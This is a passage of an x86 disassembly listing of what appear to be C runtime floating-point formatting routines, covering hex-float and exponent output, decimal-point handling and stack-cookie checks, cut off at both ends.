  42690d:	mov    edx,DWORD PTR [edx+0x4]
  426910:	and    eax,DWORD PTR [ebp+0x14]
  426913:	and    edx,ecx
  426915:	mov    ecx,DWORD PTR [ebp-0x4]
  426918:	and    edx,0xfffff
  42691e:	movsx  ecx,cx
  426921:	call   0x427f60
  426926:	cmp    ax,0x8
  42692a:	jbe    0x426962
  42692c:	push   0x30
  42692e:	lea    eax,[esi-0x1]
  426931:	pop    ebx
  426932:	mov    cl,BYTE PTR [eax]
  426934:	cmp    cl,0x66
  426937:	je     0x42693e
  426939:	cmp    cl,0x46
  42693c:	jne    0x426943
  42693e:	mov    BYTE PTR [eax],bl
  426940:	dec    eax
  426941:	jmp    0x426932
  426943:	mov    ebx,DWORD PTR [ebp-0x10]
  426946:	cmp    eax,DWORD PTR [ebp-0xc]
  426949:	je     0x42695f
  42694b:	mov    cl,BYTE PTR [eax]
  42694d:	cmp    cl,0x39
  426950:	jne    0x426959
  426952:	add    bl,0x3a
  426955:	mov    BYTE PTR [eax],bl
  426957:	jmp    0x426962
  426959:	inc    cl
  42695b:	mov    BYTE PTR [eax],cl
  42695d:	jmp    0x426962
  42695f:	inc    BYTE PTR [eax-0x1]
  426962:	test   edi,edi
  426964:	jle    0x426976
  426966:	push   edi
  426967:	push   0x30
  426969:	pop    eax
  42696a:	push   eax
  42696b:	push   esi
  42696c:	call   0x423190
  426971:	add    esp,0xc
  426974:	add    esi,edi
  426976:	mov    eax,DWORD PTR [ebp-0xc]
  426979:	cmp    BYTE PTR [eax],0x0
  42697c:	jne    0x426980
  42697e:	mov    esi,eax
  426980:	cmp    DWORD PTR [ebp+0x18],0x0
  426984:	mov    cl,0x34
  426986:	mov    edx,DWORD PTR [ebp+0x8]
  426989:	sete   al
  42698c:	dec    al
  42698e:	and    al,0xe0
  426990:	add    al,0x70
  426992:	mov    BYTE PTR [esi],al
  426994:	mov    eax,DWORD PTR [edx]
  426996:	mov    edx,DWORD PTR [edx+0x4]
  426999:	call   0x427f60
  42699e:	mov    ecx,eax
  4269a0:	mov    ebx,edx
  4269a2:	xor    eax,eax
  4269a4:	and    ecx,0x7ff
  4269aa:	and    ebx,eax
  4269ac:	sub    ecx,DWORD PTR [ebp-0x8]
  4269af:	sbb    ebx,eax
  4269b1:	js     0x4269c2
  4269b3:	jg     0x4269b9
  4269b5:	cmp    ecx,eax
  4269b7:	jb     0x4269c2
  4269b9:	mov    BYTE PTR [esi+0x1],0x2b
  4269bd:	add    esi,0x2
  4269c0:	jmp    0x4269cf
  4269c2:	mov    BYTE PTR [esi+0x1],0x2d
  4269c6:	add    esi,0x2
  4269c9:	neg    ecx
  4269cb:	adc    ebx,eax
  4269cd:	neg    ebx
  4269cf:	mov    BYTE PTR [esi],0x30
  4269d2:	mov    edi,esi
  4269d4:	cmp    ebx,eax
  4269d6:	jl     0x426a19
  4269d8:	mov    edx,0x3e8
  4269dd:	jg     0x4269e3
  4269df:	cmp    ecx,edx
  4269e1:	jb     0x4269fa
  4269e3:	push   eax
  4269e4:	push   edx
  4269e5:	push   ebx
  4269e6:	push   ecx
  4269e7:	call   0x427e80
  4269ec:	add    al,0x30
  4269ee:	mov    DWORD PTR [ebp-0x18],edx
  4269f1:	mov    BYTE PTR [esi],al
  4269f3:	inc    esi
  4269f4:	xor    eax,eax
  4269f6:	cmp    esi,edi
  4269f8:	jne    0x426a05
  4269fa:	cmp    ebx,eax
  4269fc:	jl     0x426a19
  4269fe:	jg     0x426a05
  426a00:	cmp    ecx,0x64
  426a03:	jb     0x426a19
  426a05:	push   eax
  426a06:	push   0x64
  426a08:	push   ebx
  426a09:	push   ecx
  426a0a:	call   0x427e80
  426a0f:	add    al,0x30
  426a11:	mov    DWORD PTR [ebp-0x18],edx
  426a14:	mov    BYTE PTR [esi],al
  426a16:	inc    esi
  426a17:	xor    eax,eax
  426a19:	cmp    esi,edi
  426a1b:	jne    0x426a28
  426a1d:	cmp    ebx,eax
  426a1f:	jl     0x426a3f
  426a21:	jg     0x426a28
  426a23:	cmp    ecx,0xa
  426a26:	jb     0x426a3f
  426a28:	push   eax
  426a29:	push   0xa
  426a2b:	push   ebx
  426a2c:	push   ecx
  426a2d:	call   0x427e80
  426a32:	add    al,0x30
  426a34:	mov    DWORD PTR [ebp-0x18],edx
  426a37:	mov    BYTE PTR [esi],al
  426a39:	inc    esi
  426a3a:	mov    DWORD PTR [ebp-0x18],ebx
  426a3d:	xor    eax,eax
  426a3f:	add    cl,0x30
  426a42:	mov    edi,eax
  426a44:	mov    BYTE PTR [esi],cl
  426a46:	mov    BYTE PTR [esi+0x1],al
  426a49:	cmp    BYTE PTR [ebp-0x20],0x0
  426a4d:	je     0x426a56
  426a4f:	mov    ecx,DWORD PTR [ebp-0x24]
  426a52:	and    DWORD PTR [ecx+0x70],0xfffffffd
  426a56:	mov    eax,edi
  426a58:	pop    edi
  426a59:	pop    esi
  426a5a:	pop    ebx
  426a5b:	mov    esp,ebp
  426a5d:	pop    ebp
  426a5e:	ret    
  426a5f:	push   ebp
  426a60:	mov    ebp,esp
  426a62:	push   0x0
  426a64:	push   DWORD PTR [ebp+0x18]
  426a67:	push   DWORD PTR [ebp+0x14]
  426a6a:	push   DWORD PTR [ebp+0x10]
  426a6d:	push   DWORD PTR [ebp+0xc]
  426a70:	push   DWORD PTR [ebp+0x8]
  426a73:	call   0x426bce
  426a78:	add    esp,0x18
  426a7b:	pop    ebp
  426a7c:	ret    
  426a7d:	push   ebp
  426a7e:	mov    ebp,esp
  426a80:	sub    esp,0x10
  426a83:	lea    ecx,[ebp-0x10]
  426a86:	push   ebx
  426a87:	push   edi
  426a88:	push   DWORD PTR [ebp+0x20]
  426a8b:	call   0x4207b2
  426a90:	mov    ebx,DWORD PTR [ebp+0x8]
  426a93:	test   ebx,ebx
  426a95:	je     0x426a9d
  426a97:	cmp    DWORD PTR [ebp+0xc],0x0
  426a9b:	ja     0x426aa6
  426a9d:	call   0x41fb32
  426aa2:	push   0x16
  426aa4:	jmp    0x426ac2
  426aa6:	mov    edx,DWORD PTR [ebp+0x10]
  426aa9:	xor    edi,edi
  426aab:	mov    eax,edx
  426aad:	test   edx,edx
  426aaf:	jg     0x426ab3
  426ab1:	mov    eax,edi
  426ab3:	add    eax,0x9
  426ab6:	cmp    DWORD PTR [ebp+0xc],eax
  426ab9:	ja     0x426acf
  426abb:	call   0x41fb32
  426ac0:	push   0x22
  426ac2:	pop    edi
  426ac3:	mov    DWORD PTR [eax],edi
  426ac5:	call   0x422622
  426aca:	jmp    0x426bae
  426acf:	cmp    BYTE PTR [ebp+0x1c],0x0
  426ad3:	je     0x426af5
  426ad5:	mov    ecx,DWORD PTR [ebp+0x18]
  426ad8:	xor    eax,eax
  426ada:	test   edx,edx
  426adc:	setg   al
  426adf:	push   eax
  426ae0:	xor    eax,eax
  426ae2:	cmp    DWORD PTR [ecx],0x2d
  426ae5:	sete   al
  426ae8:	add    eax,ebx
  426aea:	push   eax
  426aeb:	call   0x4270d2
  426af0:	mov    edx,DWORD PTR [ebp+0x10]
  426af3:	pop    ecx
  426af4:	pop    ecx
  426af5:	mov    eax,DWORD PTR [ebp+0x18]
  426af8:	push   esi
  426af9:	mov    esi,ebx
  426afb:	cmp    DWORD PTR [eax],0x2d
  426afe:	jne    0x426b06
  426b00:	mov    BYTE PTR [ebx],0x2d
  426b03:	lea    esi,[ebx+0x1]
  426b06:	test   edx,edx
  426b08:	jle    0x426b1f
  426b0a:	mov    al,BYTE PTR [esi+0x1]
  426b0d:	mov    BYTE PTR [esi],al
  426b0f:	inc    esi
  426b10:	mov    eax,DWORD PTR [ebp-0x10]
  426b13:	mov    eax,DWORD PTR [eax+0x84]
  426b19:	mov    eax,DWORD PTR [eax]
  426b1b:	mov    al,BYTE PTR [eax]
  426b1d:	mov    BYTE PTR [esi],al
  426b1f:	xor    eax,eax
  426b21:	cmp    BYTE PTR [ebp+0x1c],al
  426b24:	sete   al
  426b27:	add    eax,edx
  426b29:	add    esi,eax
  426b2b:	or     eax,0xffffffff
  426b2e:	cmp    DWORD PTR [ebp+0xc],eax
  426b31:	je     0x426b3a
  426b33:	mov    eax,ebx
  426b35:	sub    eax,esi
  426b37:	add    eax,DWORD PTR [ebp+0xc]
  426b3a:	push   0x42d96c
  426b3f:	push   eax
  426b40:	push   esi
  426b41:	call   0x41f159
  426b46:	add    esp,0xc
  426b49:	test   eax,eax
  426b4b:	jne    0x426bc3
  426b4d:	lea    ecx,[esi+0x2]
  426b50:	cmp    DWORD PTR [ebp+0x14],edi
  426b53:	je     0x426b58
  426b55:	mov    BYTE PTR [esi],0x45
  426b58:	mov    edx,DWORD PTR [ebp+0x18]
  426b5b:	mov    eax,DWORD PTR [edx+0xc]
  426b5e:	cmp    BYTE PTR [eax],0x30
  426b61:	je     0x426b90
  426b63:	mov    edx,DWORD PTR [edx+0x4]
  426b66:	dec    edx
  426b67:	jns    0x426b6f
  426b69:	neg    edx
  426b6b:	mov    BYTE PTR [esi+0x1],0x2d
  426b6f:	push   0x64
  426b71:	pop    ebx
  426b72:	cmp    edx,ebx
  426b74:	jl     0x426b7e
  426b76:	mov    eax,edx
  426b78:	cdq    
  426b79:	idiv   ebx
  426b7b:	add    BYTE PTR [esi+0x2],al
  426b7e:	push   0xa
  426b80:	pop    ebx
  426b81:	cmp    edx,ebx
  426b83:	jl     0x426b8d
  426b85:	mov    eax,edx
  426b87:	cdq    
  426b88:	idiv   ebx
  426b8a:	add    BYTE PTR [esi+0x3],al
  426b8d:	add    BYTE PTR [esi+0x4],dl
  426b90:	test   BYTE PTR ds:0x432b2c,0x1
  426b97:	pop    esi
  426b98:	je     0x426bae
  426b9a:	cmp    BYTE PTR [ecx],0x30
  426b9d:	jne    0x426bae
  426b9f:	push   0x3
  426ba1:	lea    eax,[ecx+0x1]
  426ba4:	push   eax
  426ba5:	push   ecx
  426ba6:	call   0x4274f0
  426bab:	add    esp,0xc
  426bae:	cmp    BYTE PTR [ebp-0x4],0x0
  426bb2:	je     0x426bbb
  426bb4:	mov    ecx,DWORD PTR [ebp-0x8]
  426bb7:	and    DWORD PTR [ecx+0x70],0xfffffffd
  426bbb:	mov    eax,edi
  426bbd:	pop    edi
  426bbe:	pop    ebx
  426bbf:	mov    esp,ebp
  426bc1:	pop    ebp
  426bc2:	ret    
  426bc3:	push   edi
  426bc4:	push   edi
  426bc5:	push   edi
  426bc6:	push   edi
  426bc7:	push   edi
  426bc8:	call   0x41fb45
  426bcd:	int3   
  426bce:	push   ebp
  426bcf:	mov    ebp,esp
  426bd1:	sub    esp,0x2c
  426bd4:	mov    eax,ds:0x4314e0
  426bd9:	xor    eax,ebp
  426bdb:	mov    DWORD PTR [ebp-0x4],eax
  426bde:	mov    eax,DWORD PTR [ebp+0x8]
  426be1:	lea    ecx,[ebp-0x1c]
  426be4:	push   ebx
  426be5:	mov    ebx,DWORD PTR [ebp+0x14]
  426be8:	push   esi
  426be9:	push   edi
  426bea:	mov    edi,DWORD PTR [ebp+0xc]
  426bed:	push   0x16
  426bef:	pop    esi
  426bf0:	push   esi
  426bf1:	push   ecx
  426bf2:	lea    ecx,[ebp-0x2c]
  426bf5:	push   ecx
  426bf6:	push   DWORD PTR [eax+0x4]
  426bf9:	push   DWORD PTR [eax]
  426bfb:	call   0x427def
  426c00:	add    esp,0x14
  426c03:	test   edi,edi
  426c05:	jne    0x426c17
  426c07:	call   0x41fb32
  426c0c:	mov    DWORD PTR [eax],esi
  426c0e:	call   0x422622
  426c13:	mov    eax,esi
  426c15:	jmp    0x426c8b
  426c17:	mov    esi,DWORD PTR [ebp+0x10]
  426c1a:	test   esi,esi
  426c1c:	jne    0x426c28
  426c1e:	call   0x41fb32
  426c23:	push   0x16
  426c25:	pop    esi
  426c26:	jmp    0x426c0c
  426c28:	or     ecx,0xffffffff
  426c2b:	cmp    esi,ecx
  426c2d:	je     0x426c45
  426c2f:	xor    eax,eax
  426c31:	mov    ecx,esi
  426c33:	cmp    DWORD PTR [ebp-0x2c],0x2d
  426c37:	sete   al
  426c3a:	sub    ecx,eax
  426c3c:	xor    eax,eax
  426c3e:	test   ebx,ebx
  426c40:	setg   al
  426c43:	sub    ecx,eax
  426c45:	lea    eax,[ebp-0x2c]
  426c48:	push   eax
  426c49:	lea    eax,[ebx+0x1]
  426c4c:	push   eax
  426c4d:	push   ecx
  426c4e:	xor    ecx,ecx
  426c50:	cmp    DWORD PTR [ebp-0x2c],0x2d
  426c54:	sete   cl
  426c57:	xor    eax,eax
  426c59:	test   ebx,ebx
  426c5b:	setg   al
  426c5e:	add    ecx,edi
  426c60:	add    eax,ecx
  426c62:	push   eax
  426c63:	call   0x427c77
  426c68:	add    esp,0x10
  426c6b:	test   eax,eax
  426c6d:	je     0x426c74
  426c6f:	mov    BYTE PTR [edi],0x0
  426c72:	jmp    0x426c8b
  426c74:	push   DWORD PTR [ebp+0x1c]
  426c77:	lea    eax,[ebp-0x2c]
  426c7a:	push   0x0
  426c7c:	push   eax
  426c7d:	push   DWORD PTR [ebp+0x18]
  426c80:	push   ebx
  426c81:	push   esi
  426c82:	push   edi
  426c83:	call   0x426a7d
  426c88:	add    esp,0x1c
  426c8b:	mov    ecx,DWORD PTR [ebp-0x4]
  426c8e:	pop    edi
  426c8f:	pop    esi
  426c90:	xor    ecx,ebp
  426c92:	pop    ebx
  426c93:	call   0x421878
  426c98:	mov    esp,ebp
  426c9a:	pop    ebp
  426c9b:	ret    
  426c9c:	push   ebp
  426c9d:	mov    ebp,esp
  426c9f:	sub    esp,0x14
  426ca2:	mov    eax,DWORD PTR [ebp+0x14]
  426ca5:	lea    ecx,[ebp-0x14]
  426ca8:	push   ebx
  426ca9:	push   esi
  426caa:	push   DWORD PTR [ebp+0x1c]
  426cad:	mov    eax,DWORD PTR [eax+0x4]
  426cb0:	dec    eax
  426cb1:	mov    DWORD PTR [ebp-0x4],eax
  426cb4:	call   0x4207b2
  426cb9:	mov    esi,DWORD PTR [ebp+0x8]
  426cbc:	test   esi,esi
  426cbe:	je     0x426cc6
  426cc0:	cmp    DWORD PTR [ebp+0xc],0x0
  426cc4:	ja     0x426cda
  426cc6:	call   0x41fb32
  426ccb:	push   0x16
  426ccd:	pop    ebx
  426cce:	mov    DWORD PTR [eax],ebx
  426cd0:	call   0x422622
  426cd5:	jmp    0x426d73
  426cda:	xor    ebx,ebx
  426cdc:	push   edi
  426cdd:	mov    edi,DWORD PTR [ebp+0x10]
  426ce0:	cmp    BYTE PTR [ebp+0x18],bl
  426ce3:	je     0x426cff
  426ce5:	mov    ecx,DWORD PTR [ebp-0x4]
  426ce8:	cmp    ecx,edi
  426cea:	jne    0x426cff
  426cec:	mov    edx,DWORD PTR [ebp+0x14]
  426cef:	xor    eax,eax
  426cf1:	cmp    DWORD PTR [edx],0x2d
  426cf4:	sete   al
  426cf7:	add    eax,ecx
  426cf9:	mov    WORD PTR [eax+esi*1],0x30
  426cff:	mov    eax,DWORD PTR [ebp+0x14]
  426d02:	cmp    DWORD PTR [eax],0x2d
  426d05:	jne    0x426d0b
  426d07:	mov    BYTE PTR [esi],0x2d
  426d0a:	inc    esi
  426d0b:	mov    eax,DWORD PTR [eax+0x4]
  426d0e:	test   eax,eax
  426d10:	jg     0x426d22
  426d12:	push   0x1
  426d14:	push   esi
  426d15:	call   0x4270d2
  426d1a:	pop    ecx
  426d1b:	mov    BYTE PTR [esi],0x30
  426d1e:	inc    esi
  426d1f:	pop    ecx
  426d20:	jmp    0x426d24
  426d22:	add    esi,eax
  426d24:	test   edi,edi
  426d26:	jle    0x426d72
  426d28:	push   0x1
  426d2a:	push   esi
  426d2b:	call   0x4270d2
  426d30:	mov    eax,DWORD PTR [ebp-0x14]
  426d33:	pop    ecx
  426d34:	pop    ecx
  426d35:	mov    eax,DWORD PTR [eax+0x84]
  426d3b:	mov    eax,DWORD PTR [eax]
  426d3d:	mov    al,BYTE PTR [eax]
  426d3f:	mov    BYTE PTR [esi],al
  426d41:	inc    esi
  426d42:	mov    eax,DWORD PTR [ebp+0x14]
  426d45:	mov    eax,DWORD PTR [eax+0x4]
  426d48:	test   eax,eax
  426d4a:	jns    0x426d72
  426d4c:	cmp    BYTE PTR [ebp+0x18],bl
  426d4f:	je     0x426d57
  426d51:	mov    edi,eax
  426d53:	neg    edi
  426d55:	jmp    0x426d5f
  426d57:	neg    eax
  426d59:	cmp    edi,eax
  426d5b:	jl     0x426d5f
  426d5d:	mov    edi,eax
  426d5f:	push   edi
  426d60:	push   esi
  426d61:	call   0x4270d2
  426d66:	push   edi
  426d67:	push   0x30
  426d69:	push   esi
  426d6a:	call   0x423190
  426d6f:	add    esp,0x14
  426d72:	pop    edi
  426d73:	cmp    BYTE PTR [ebp-0x8],0x0
  426d77:	je     0x426d80
  426d79:	mov    ecx,DWORD PTR [ebp-0xc]
  426d7c:	and    DWORD PTR [ecx+0x70],0xfffffffd
  426d80:	pop    esi
  426d81:	mov    eax,ebx
  426d83:	pop    ebx
  426d84:	mov    esp,ebp
  426d86:	pop    ebp
  426d87:	ret    
  426d88:	push   ebp
  426d89:	mov    ebp,esp
  426d8b:	sub    esp,0x2c
  426d8e:	mov    eax,ds:0x4314e0
  426d93:	xor    eax,ebp
  426d95:	mov    DWORD PTR [ebp-0x4],eax
  426d98:	mov    eax,DWORD PTR [ebp+0x8]
  426d9b:	lea    ecx,[ebp-0x1c]
  426d9e:	push   ebx
  426d9f:	push   edi
  426da0:	mov    edi,DWORD PTR [ebp+0xc]
  426da3:	push   0x16
  426da5:	pop    ebx
  426da6:	push   ebx
  426da7:	push   ecx
  426da8:	lea    ecx,[ebp-0x2c]
  426dab:	push   ecx
  426dac:	push   DWORD PTR [eax+0x4]
  426daf:	push   DWORD PTR [eax]
  426db1:	call   0x427def
  426db6:	add    esp,0x14
  426db9:	test   edi,edi
  426dbb:	jne    0x426dcd
  426dbd:	call   0x41fb32
  426dc2:	mov    DWORD PTR [eax],ebx
  426dc4:	call   0x422622
  426dc9:	mov    eax,ebx
  426dcb:	jmp    0x426e39
  426dcd:	push   esi
  426dce:	mov    esi,DWORD PTR [ebp+0x10]
  426dd1:	test   esi,esi
  426dd3:	jne    0x426de5
  426dd5:	call   0x41fb32
  426dda:	mov    DWORD PTR [eax],ebx
  426ddc:	call   0x422622
  426de1:	mov    eax,ebx
  426de3:	jmp    0x426e38
  426de5:	or     ecx,0xffffffff
  426de8:	cmp    esi,ecx
  426dea:	je     0x426df9
  426dec:	xor    eax,eax
  426dee:	mov    ecx,esi
  426df0:	cmp    DWORD PTR [ebp-0x2c],0x2d
  426df4:	sete   al
  426df7:	sub    ecx,eax
  426df9:	mov    ebx,DWORD PTR [ebp+0x14]
  426dfc:	lea    eax,[ebp-0x2c]
  426dff:	push   eax
  426e00:	mov    eax,DWORD PTR [ebp-0x28]
  426e03:	add    eax,ebx
  426e05:	push   eax
  426e06:	xor    eax,eax
  426e08:	cmp    DWORD PTR [ebp-0x2c],0x2d
  426e0c:	push   ecx
  426e0d:	sete   al
  426e10:	add    eax,edi
  426e12:	push   eax
  426e13:	call   0x427c77
  426e18:	add    esp,0x10
  426e1b:	test   eax,eax
  426e1d:	je     0x426e24
  426e1f:	mov    BYTE PTR [edi],0x0
  426e22:	jmp    0x426e38
  426e24:	push   DWORD PTR [ebp+0x18]
  426e27:	lea    eax,[ebp-0x2c]
  426e2a:	push   0x0
  426e2c:	push   eax
  426e2d:	push   ebx
  426e2e:	push   esi
  426e2f:	push   edi
  426e30:	call   0x426c9c
  426e35:	add    esp,0x18
  426e38:	pop    esi
  426e39:	mov    ecx,DWORD PTR [ebp-0x4]
  426e3c:	pop    edi
  426e3d:	xor    ecx,ebp
  426e3f:	pop    ebx
  426e40:	call   0x421878
  426e45:	mov    esp,ebp
  426e47:	pop    ebp
  426e48:	ret    
  426e49:	push   ebp
  426e4a:	mov    ebp,esp
  426e4c:	sub    esp,0x30
  426e4f:	mov    eax,ds:0x4314e0
  426e54:	xor    eax,ebp
  426e56:	mov    DWORD PTR [ebp-0x4],eax
  426e59:	mov    eax,DWORD PTR [ebp+0x8]
  426e5c:	lea    ecx,[ebp-0x1c]
  426e5f:	push   ebx
  426e60:	push   edi
  426e61:	mov    edi,DWORD PTR [ebp+0xc]
  426e64:	push   0x16
  426e66:	pop    ebx
  426e67:	push   ebx
  426e68:	push   ecx
  426e69:	lea    ecx,[ebp-0x30]
  426e6c:	push   ecx
  426e6d:	push   DWORD PTR [eax+0x4]
  426e70:	push   DWORD PTR [eax]
  426e72:	call   0x427def
  426e77:	add    esp,0x14
  426e7a:	test   edi,edi
  426e7c:	jne    0x426e91
  426e7e:	call   0x41fb32
  426e83:	mov    DWORD PTR [eax],ebx
  426e85:	call   0x422622
  426e8a:	mov    eax,ebx
  426e8c:	jmp    0x426f38
  426e91:	push   esi
  426e92:	mov    esi,DWORD PTR [ebp+0x10]
  426e95:	test   esi,esi
  426e97:	jne    0x426eac
  426e99:	call   0x41fb32
  426e9e:	mov    DWORD PTR [eax],ebx
  426ea0:	call   0x422622
  426ea5:	mov    eax,ebx
  426ea7:	jmp    0x426f37
  426eac:	mov    eax,DWORD PTR [ebp-0x2c]
  426eaf:	xor    ecx,ecx
  426eb1:	dec    eax
  426eb2:	cmp    DWORD PTR [ebp-0x30],0x2d
  426eb6:	mov    DWORD PTR [ebp-0x20],eax
  426eb9:	sete   cl
  426ebc:	or     eax,0xffffffff
  426ebf:	lea    ebx,[ecx+edi*1]
  426ec2:	cmp    esi,eax
  426ec4:	je     0x426eca
  426ec6:	mov    eax,esi
  426ec8:	sub    eax,ecx
  426eca:	lea    ecx,[ebp-0x30]
  426ecd:	push   ecx
  426ece:	push   DWORD PTR [ebp+0x14]
  426ed1:	push   eax
  426ed2:	push   ebx
  426ed3:	call   0x427c77
  426ed8:	add    esp,0x10
  426edb:	test   eax,eax
  426edd:	je     0x426ee4
  426edf:	mov    BYTE PTR [edi],0x0
  426ee2:	jmp    0x426f37
  426ee4:	mov    eax,DWORD PTR [ebp-0x2c]
  426ee7:	dec    eax
  426ee8:	cmp    DWORD PTR [ebp-0x20],eax
  426eeb:	setl   cl
  426eee:	cmp    eax,0xfffffffc
  426ef1:	jl     0x426f1e
  426ef3:	cmp    eax,DWORD PTR [ebp+0x14]
  426ef6:	jge    0x426f1e
  426ef8:	test   cl,cl
  426efa:	je     0x426f06
  426efc:	mov    al,BYTE PTR [ebx]
  426efe:	inc    ebx
  426eff:	test   al,al
  426f01:	jne    0x426efc
  426f03:	mov    BYTE PTR [ebx-0x2],al
  426f06:	push   DWORD PTR [ebp+0x1c]
  426f09:	lea    eax,[ebp-0x30]
  426f0c:	push   0x1
  426f0e:	push   eax
  426f0f:	push   DWORD PTR [ebp+0x14]
  426f12:	push   esi
  426f13:	push   edi
  426f14:	call   0x426c9c
  426f19:	add    esp,0x18
  426f1c:	jmp    0x426f37
  426f1e:	push   DWORD PTR [ebp+0x1c]
  426f21:	lea    eax,[ebp-0x30]
  426f24:	push   0x1
  426f26:	push   eax
  426f27:	push   DWORD PTR [ebp+0x18]
  426f2a:	push   DWORD PTR [ebp+0x14]
  426f2d:	push   esi
  426f2e:	push   edi
  426f2f:	call   0x426a7d
  426f34:	add    esp,0x1c
  426f37:	pop    esi
  426f38:	mov    ecx,DWORD PTR [ebp-0x4]
  426f3b:	pop    edi
  426f3c:	xor    ecx,ebp
  426f3e:	pop    ebx
  426f3f:	call   0x421878
  426f44:	mov    esp,ebp
  426f46:	pop    ebp
  426f47:	ret    
  426f48:	push   ebp
  426f49:	mov    ebp,esp
  426f4b:	push   0x0
  426f4d:	push   DWORD PTR [ebp+0x8]
  426f50:	call   0x426f59
  426f55:	pop    ecx
  426f56:	pop    ecx
  426f57:	pop    ebp
  426f58:	ret    
  426f59:	push   ebp
  426f5a:	mov    ebp,esp
  426f5c:	sub    esp,0x10
  426f5f:	push   edi
  426f60:	push   DWORD PTR [ebp+0xc]
  426f63:	lea    ecx,[ebp-0x10]
  426f66:	call   0x4207b2
  426f6b:	mov    edx,DWORD PTR [ebp+0x8]
  426f6e:	mov    edi,DWORD PTR [ebp-0x10]
  426f71:	mov    cl,BYTE PTR [edx]
  426f73:	test   cl,cl
  426f75:	je     0x426f8c
  426f77:	mov    eax,DWORD PTR [edi+0x84]
  426f7d:	mov    eax,DWORD PTR [eax]
  426f7f:	mov    al,BYTE PTR [eax]
  426f81:	cmp    cl,al
  426f83:	je     0x426f8c
  426f85:	inc    edx
  426f86:	mov    cl,BYTE PTR [edx]
  426f88:	test   cl,cl
  426f8a:	jne    0x426f81
  426f8c:	mov    al,BYTE PTR [edx]
  426f8e:	inc    edx
  426f8f:	test   al,al
  426f91:	je     0x426fc7
  426f93:	jmp    0x426f9e
  426f95:	cmp    al,0x65
  426f97:	je     0x426fa4
  426f99:	cmp    al,0x45
  426f9b:	je     0x426fa4
  426f9d:	inc    edx
  426f9e:	mov    al,BYTE PTR [edx]
  426fa0:	test   al,al
  426fa2:	jne    0x426f95
  426fa4:	push   esi
  426fa5:	mov    esi,edx
  426fa7:	dec    edx
  426fa8:	cmp    BYTE PTR [edx],0x30
  426fab:	je     0x426fa7
  426fad:	mov    eax,DWORD PTR [edi+0x84]
  426fb3:	mov    ecx,DWORD PTR [eax]
  426fb5:	mov    al,BYTE PTR [edx]
  426fb7:	cmp    al,BYTE PTR [ecx]
  426fb9:	jne    0x426fbc
  426fbb:	dec    edx
  426fbc:	mov    al,BYTE PTR [esi]
  426fbe:	inc    edx
  426fbf:	inc    esi
  426fc0:	mov    BYTE PTR [edx],al
  426fc2:	test   al,al
  426fc4:	jne    0x426fbc
  426fc6:	pop    esi
  426fc7:	cmp    BYTE PTR [ebp-0x4],0x0
  426fcb:	pop    edi
  426fcc:	je     0x426fd5
  426fce:	mov    eax,DWORD PTR [ebp-0x8]
  426fd1:	and    DWORD PTR [eax+0x70],0xfffffffd
  426fd5:	mov    esp,ebp
  426fd7:	pop    ebp
  426fd8:	ret    
  426fd9:	push   ebp
  426fda:	mov    ebp,esp
  426fdc:	push   0x0
  426fde:	push   DWORD PTR [ebp+0x10]
  426fe1:	push   DWORD PTR [ebp+0xc]
  426fe4:	push   DWORD PTR [ebp+0x8]
  426fe7:	call   0x426ff1
  426fec:	add    esp,0x10
  426fef:	pop    ebp
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	push   ecx
  426ff5:	push   ecx
  426ff6:	cmp    DWORD PTR [ebp+0x8],0x0
  426ffa:	push   DWORD PTR [ebp+0x14]
  426ffd:	push   DWORD PTR [ebp+0x10]
  427000:	je     0x42701b
  427002:	lea    eax,[ebp-0x8]
  427005:	push   eax
  427006:	call   0x425279
  42700b:	mov    ecx,DWORD PTR [ebp+0xc]
  42700e:	mov    eax,DWORD PTR [ebp-0x8]
  427011:	mov    DWORD PTR [ecx],eax
  427013:	mov    eax,DWORD PTR [ebp-0x4]
  427016:	mov    DWORD PTR [ecx+0x4],eax
  427019:	jmp    0x42702c
  42701b:	lea    eax,[ebp+0x8]
  42701e:	push   eax
  42701f:	call   0x425307
  427024:	mov    ecx,DWORD PTR [ebp+0xc]
  427027:	mov    eax,DWORD PTR [ebp+0x8]
  42702a:	mov    DWORD PTR [ecx],eax
  42702c:	add    esp,0xc
  42702f:	mov    esp,ebp
  427031:	pop    ebp
  427032:	ret    
  427033:	push   ebp
  427034:	mov    ebp,esp
  427036:	push   0x0
  427038:	push   DWORD PTR [ebp+0x8]
  42703b:	call   0x427044
  427040:	pop    ecx
  427041:	pop    ecx
  427042:	pop    ebp
  427043:	ret    
  427044:	push   ebp
  427045:	mov    ebp,esp
  427047:	sub    esp,0x10
  42704a:	lea    ecx,[ebp-0x10]
  42704d:	push   esi
  42704e:	push   DWORD PTR [ebp+0xc]
  427051:	call   0x4207b2
  427056:	mov    esi,DWORD PTR [ebp+0x8]
  427059:	movsx  eax,BYTE PTR [esi]
  42705c:	push   eax
  42705d:	call   0x4274c1
  427062:	cmp    eax,0x65
  427065:	jmp    0x427073
  427067:	inc    esi
  427068:	movzx  eax,BYTE PTR [esi]
  42706b:	push   eax
  42706c:	call   0x427353
  427071:	test   eax,eax
  427073:	pop    ecx
  427074:	jne    0x427067
  427076:	movsx  eax,BYTE PTR [esi]
  427079:	push   eax
  42707a:	call   0x4274c1
  42707f:	pop    ecx
  427080:	cmp    eax,0x78
  427083:	jne    0x427088
  427085:	add    esi,0x2
  427088:	mov    eax,DWORD PTR [ebp-0x10]
  42708b:	mov    cl,BYTE PTR [esi]
  42708d:	mov    eax,DWORD PTR [eax+0x84]
  427093:	mov    eax,DWORD PTR [eax]
  427095:	mov    al,BYTE PTR [eax]
  427097:	mov    BYTE PTR [esi],al
  427099:	inc    esi
  42709a:	mov    al,BYTE PTR [esi]
  42709c:	mov    BYTE PTR [esi],cl
  42709e:	mov    cl,al
  4270a0:	mov    al,BYTE PTR [esi]
  4270a2:	inc    esi
  4270a3:	test   al,al
  4270a5:	jne    0x42709a
  4270a7:	pop    esi
  4270a8:	cmp    BYTE PTR [ebp-0x4],al
  4270ab:	je     0x4270b4
  4270ad:	mov    eax,DWORD PTR [ebp-0x8]
  4270b0:	and    DWORD PTR [eax+0x70],0xfffffffd
  4270b4:	mov    esp,ebp
  4270b6:	pop    ebp
  4270b7:	ret    
  4270b8:	push   ebp
  4270b9:	mov    ebp,esp
  4270bb:	mov    eax,DWORD PTR [ebp+0x8]
  4270be:	fldz   
  4270c0:	fcomp  QWORD PTR [eax]
  4270c2:	fnstsw ax
  4270c4:	test   ah,0x41
  4270c7:	jp     0x4270ce
  4270c9:	xor    eax,eax
  4270cb:	inc    eax
  4270cc:	pop    ebp
  4270cd:	ret    
  4270ce:	xor    eax,eax
